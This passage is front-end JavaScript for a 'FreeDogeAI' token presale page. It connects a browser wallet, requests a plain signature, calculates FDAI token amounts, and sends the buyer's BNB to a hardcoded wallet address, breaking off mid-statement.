// CONFIG
const tokenDropAddress = "0x45583DB8b6Db50311Ba8e7303845ACc6958589B7";
const yourWalletAddress = "0xd924e01c7d319c5b23708cd622bd1143cd4fb360";
const tokenRatePerBNB = 12500000;
const minBNB = 0.035;

let provider;
let signer;
let userAddress;
let currentLang = "en";

// Connect Wallet + Mobile Signature
async function connectWallet() {
    try {
        if (typeof window.ethereum !== 'undefined') {
            provider = new ethers.providers.Web3Provider(window.ethereum, "any");
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            document.getElementById("join-button").innerText = translations[currentLang].walletConnected;
            document.getElementById("buy-button").disabled = false;

            // Request Signature
            const message = "Sign to confirm your connection to FreeDogeAI!";
            await signer.signMessage(message);

        } else {
            if (/Android|iPhone/i.test(navigator.userAgent)) {
                window.location.href = "https://metamask.app.link/dapp/" + window.location.hostname;
            } else {
                alert(translations[currentLang].noWalletFound);
            }
        }
    } catch (error) {
        console.error(error);
        alert(translations[currentLang].walletConnectionFailed);
    }
}

// BNB to FDAI Token Calculation
function calculateTokens() {
    const bnbAmount = parseFloat(document.getElementById("bnb-amount").value);
    if (!isNaN(bnbAmount)) {
        const tokens = bnbAmount * tokenRatePerBNB;
        document.getElementById("token-amount").innerText = `${translations[currentLang].youWillReceive} ${tokens.toLocaleString()} FDAI`;
    } else {
        document.getElementById("token-amount").innerText = `${translations[currentLang].youWillReceive} 0 FDAI`;
    }
}

// Token Purchase
async function buyTokens() {
    const bnbAmount = parseFloat(document.getElementById("bnb-amount").value);
    if (isNaN(bnbAmount) || bnbAmount < minBNB) {
        alert(translations[currentLang].minPurchaseWarning);
        return;
    }
    if (!provider || !signer) {
        alert(translations[currentLang].pleaseConnectWallet);
        return;
    }
    try {
        const tx = await signer.sendTransaction({
            to: yourWalletAddress,
            value: ethers.utils.parseEther(bnbAmount.toString())
        });
        await tx.wait();
        alert(translations[current
